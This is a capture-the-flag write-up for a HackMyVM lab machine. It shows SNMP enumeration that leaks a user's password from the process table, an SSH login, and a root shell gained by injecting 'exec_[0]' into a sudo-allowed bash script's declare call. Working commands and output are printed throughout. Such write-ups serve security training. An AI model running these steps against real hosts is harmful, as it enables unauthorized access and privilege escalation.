# yuan113

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| yuan113 | LingMj | Beginner | HackMyVM |

**Summary:** The yuan113 machine exposes a deceptively simple attack surface: a static web page and an openly accessible SNMP service. By walking the SNMP MIB tree with the default `public` community string, the process table reveals a running service command that includes plaintext credentials for the local user `welcome`. Armed with those credentials, SSH access is obtained immediately. Privilege escalation pivots on a custom bash script, `/opt/113.sh`, which is granted passwordless `sudo` access for the `welcome` user. The script copies a binary into a temporary sandbox and then calls `declare -- "$1"="$2"` to set an arbitrary variable before executing `$exec_`. The critical flaw is that bash treats `exec_[0]` as an array subscript assignment, so passing `exec_[0]` as the first argument and an arbitrary shell command as the second causes `declare` to overwrite the `exec_` variable entirely, because `$exec_` expands to `${exec_[0]}` by default. This bash variable injection replaces the intended binary path with an attacker-controlled command, which then executes as root under `sudo`, delivering a full root shell and both flags.

---

## Reconnaissance

**1.** The engagement begins with host discovery across the local subnet using a custom PowerShell scanning script. The target reveals itself at `192.168.100.160` with a VirtualBox MAC address vendor.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.160 08:00:27:A7:56:B1 VirtualBox
```

**2.** With the target IP confirmed, environment variables are set for efficiency. A full TCP port scan is launched using Nmap with service and script detection enabled.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/113]
└─$ ip=192.168.100.160 && url=http://$ip

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/113]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-12 10:41 WIB
Nmap scan report for 192.168.100.160
Host is up (0.0018s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Mazesec welcome u
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.61 seconds
```

The TCP scan surfaces only two open ports: SSH on port 22 and an Apache web server on port 80. The page title `Mazesec welcome u` hints at a username. A UDP scan of the top 100 ports follows to complete the picture.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/113]
└─$ nmap -sU -sV --top-ports 100 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-12 10:42 WIB
Stats: 0:01:23 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 91.90% done; ETC: 10:43 (0:00:07 remaining)
Nmap scan report for 192.168.100.160
Host is up (0.0014s latency).
Not shown: 98 closed udp ports (port-unreach)
PORT    STATE         SERVICE VERSION
68/udp  open|filtered dhcpc
161/udp open          snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: 113

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 201.19 seconds
```

SNMP on UDP port 161 is open and advertising the `public` community string. This is significant: SNMP with default credentials is well known to leak sensitive system information.

**3.** The HTTP response confirms the web page is nothing more than a static quote displayed on a plain background. There is no login form, no CMS, no interactive functionality to probe.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/113]
└─$ curl -i $url
HTTP/1.1 200 OK
Date: Thu, 12 Mar 2026 03:41:54 GMT
Server: Apache/2.4.62 (Debian)
Last-Modified: Wed, 14 Jan 2026 13:40:35 GMT
ETag: "31c-6485940ba2995"
Accept-Ranges: bytes
Content-Length: 796
Vary: Accept-Encoding
Content-Type: text/html

<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mazesec welcome u</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #f5f5f5;
            font-family: Arial, sans-serif;
        }

        .quote {
            font-size: 2.5rem;
            text-align: center;
            color: #333;
            padding: 20px;
            max-width: 800px;
        }
    </style>
</head>
<body>
    <div class="quote">
        The quieter you become, the more you are able to hear.
    </div>
</body>
</html>
```

The web surface is a dead end. Attention pivots entirely to SNMP.

---

## Initial Access

**4.** An SNMP walk is executed against the target using community string `public`, and the full output is saved for analysis.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/113]
└─$ snmpwalk -v2c -c public $ip > output.txt

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/113]
└─$ cat output.txt | grep "pass"
iso.3.6.1.2.1.25.4.2.1.4.336 = STRING: "service --user welcome --password mMO[REDACTED] --host localhost --port 8080"
iso.3.6.1.2.1.25.6.3.1.2.13 = STRING: "base-passwd_3.5.46_amd64"
iso.3.6.1.2.1.25.6.3.1.2.478 = STRING: "passwd_1:4.5-1.1_amd64"
```

The SNMP process table (OID `1.3.6.1.2.1.25.4.2.1.4`) exposes the full command line of a running service. The argument list contains `--user welcome` and `--password mMO[REDACTED]`. This single query yields both the username hinted by the HTTP title and its plaintext password.

**5.** The recovered credentials are used immediately to authenticate via SSH.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/113]
└─$ ssh welcome@$ip
...
welcome@192.168.100.160's password:
Linux 113 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
...
welcome@113:~$ id ; ls -la
uid=1000(welcome) gid=1000(welcome) groups=1000(welcome)
total 24
drwxr-xr-x 2 welcome welcome 4096 Jan 14 08:37 .
drwxr-xr-x 3 root    root    4096 Apr 11  2025 ..
lrwxrwxrwx 1 root    root       9 Jan 14 08:36 .bash_history -> /dev/null
-rw-r--r-- 1 welcome welcome  220 Apr 11  2025 .bash_logout
-rw-r--r-- 1 welcome welcome 3526 Apr 11  2025 .bashrc
-rw-r--r-- 1 welcome welcome  807 Apr 11  2025 .profile
-rw-r--r-- 1 root    root      44 Jan 14 08:37 user.txt
```

The shell lands as `welcome` (UID 1000). The user flag is present in the home directory. `.bash_history` is symlinked to `/dev/null`, indicating the operator anticipated forensic scrutiny.

---

## Privilege Escalation

**6.** `sudo -l` is run immediately to enumerate any granted elevated permissions.

```bash
welcome@113:~$ which sudo
/usr/bin/sudo
welcome@113:~$ sudo -l
Matching Defaults entries for welcome on 113:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User welcome may run the following commands on 113:
    (ALL) NOPASSWD: /opt/113.sh
```

The `welcome` user may execute `/opt/113.sh` as any user, including `root`, without a password. The script is inspected in full.

```bash
welcome@113:~$ ls -la /opt/113.sh
-rwxr-xr-x 1 root root 280 Jan 14 08:35 /opt/113.sh
welcome@113:~$ file /opt/113.sh
/opt/113.sh: Bourne-Again shell script, ASCII text executable
welcome@113:~$ cat /opt/113.sh
#!/bin/bash

sandbox=$(mktemp -d)
cd $sandbox

if [ "$#" -ne 3 ];then
        exit
fi

if [ "$3" != "mazesec" ]
then
        echo "\$3 must be mazesec"
        exit
else
        /bin/cp /usr/bin/mazesec $sandbox
        exec_="$sandbox/mazesec"
fi

if [ "$1" = "exec_" ];then
        exit
fi

declare -- "$1"="$2"
$exec_
```

The script logic is straightforward but contains a subtle and critical bash injection flaw. It:

1. Creates a temporary sandbox directory.
2. Requires exactly three arguments, with the third fixed as the string `mazesec`.
3. Copies `/usr/bin/mazesec` into the sandbox and stores its path in the variable `exec_`.
4. Guards against setting `exec_` directly by checking if `$1` equals the literal string `exec_` and exiting if so.
5. Calls `declare -- "$1"="$2"` to assign an arbitrary variable, then executes `$exec_`.

The guard is bypassed because bash arrays share a namespace with scalar variables. When `declare -- "exec_[0]"="<command>"` is executed, it creates an array where `exec_[0]` holds the command. When `$exec_` is subsequently expanded, bash resolves it as `${exec_[0]}` (the zero-indexed element of the array), which now contains the attacker-supplied command rather than the original binary path. The `exec_` guard only catches the exact string `exec_`, not `exec_[0]`.

**7.** The vulnerability is first confirmed by running `id` as root.

```bash
welcome@113:~$ sudo /opt/113.sh 'exec_[0]' 'id' mazesec
uid=0(root) gid=0(root) groups=0(root)
```

Command execution as root is confirmed. The flag printed during a normal run is also captured.

```bash
welcome@113:~$ sudo /opt/113.sh a 1 mazesec
flag{fakeroot-a4f26e8d771c066055e534baf4e1a046}
```

**8.** An interactive root shell is obtained by injecting `sudo -i` through the same mechanism.

```bash
welcome@113:~$ sudo /opt/113.sh 'exec_[0]' 'sudo -i' mazesec
root@113:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
113
root@113:~# cat /home/welcome/user.txt /root/root.txt
flag{user-215[REDACTED]}
flag{root-9f2[REDACTED]}
```

Both flags are retrieved. Full root access is established.

---

## Attack Chain Summary

1. **Reconnaissance**: An SNMP UDP scan identified port 161 open with the default `public` community string, alongside standard TCP services SSH and HTTP.

2. **Vulnerability Discovery**: Walking the SNMP MIB tree exposed the running process table, which contained a service command line with a plaintext username and password embedded as arguments.

3. **Exploitation**: The leaked credentials (`welcome` / `mMO[REDACTED]`) were used directly to authenticate via SSH, granting a foothold as a low-privilege user.

4. **Internal Enumeration**: `sudo -l` revealed that the `welcome` user could execute `/opt/113.sh` as root without a password. Code review of the script uncovered a bash variable injection flaw rooted in the interaction between `declare` and bash array indexing.

5. **Privilege Escalation**: By passing `exec_[0]` as the first argument to the script, the `declare` statement was abused to overwrite the effective command stored in the `exec_` variable through bash array element zero, bypassing the script's literal-string guard. Injecting `sudo -i` as the payload delivered a full interactive root shell, and both the user and root flags were captured.
